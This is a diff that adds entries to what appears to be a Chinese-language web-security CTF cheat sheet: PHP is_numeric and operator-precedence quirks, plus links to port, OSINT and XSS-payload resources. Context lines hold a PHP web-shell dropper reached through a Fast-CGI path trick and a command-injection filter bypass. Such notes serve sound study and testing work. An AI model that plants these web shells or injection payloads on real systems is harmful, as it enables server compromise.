@@ -210,6 +210,13 @@ A=fl;B=ag;cat $A$B
 - `is_numeric('87 ')` => `false`
 - `is_numeric(' 87 ')` => `false`
 - `is_numeric('0xdeadbeef')` => `true`
+- 以下亦為合法(返回True)字串:
+    - `' -.0'`
+    - `'0.'`
+    - `' +2.1e5'`
+    - `' -1.5E+25'`
+    - `'1.e5'`
+
 
 ## parse_url
 
@@ -277,6 +284,11 @@ A=fl;B=ag;cat $A$B
 - ```echo `whoami`; ```
     - `kaibro`
 - 正規表達式`.`不匹配換行字元`%0a`
+- 運算優先權問題
+    - `$a = true && false;`
+        - `$a` => `false`
+    - `$a = true and false;`
+        - `$a` => `true`
 
 # Command Injection
 
@@ -1316,6 +1328,8 @@ xxe.dtd:
              - Fast-CGI開啟狀況下
              - kaibro.jpg: `<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>`
              - 訪問`kaibro.jpg/.php`生成shell.php
+- 常見Port服務
+    - http://packetlife.net/media/library/23/common_ports.pdf
 - `php -i | grep "Loaded Configuration File"`
     
     - 列出php.ini路徑
@@ -1353,6 +1367,8 @@ xxe.dtd:
 - https://censys.io
 
 - https://crt.sh/
+
+- https://x.threatbook.cn/
 
 - https://dnsdumpster.com/
 
@@ -1417,6 +1433,9 @@ xxe.dtd:
 - https://github.com/swisskyrepo/PayloadsAllTheThings/
 
 - http://xssor.io
+
+- https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt
+    - XSS Payloads
 
 - DNSLog
     - http://ceye.io
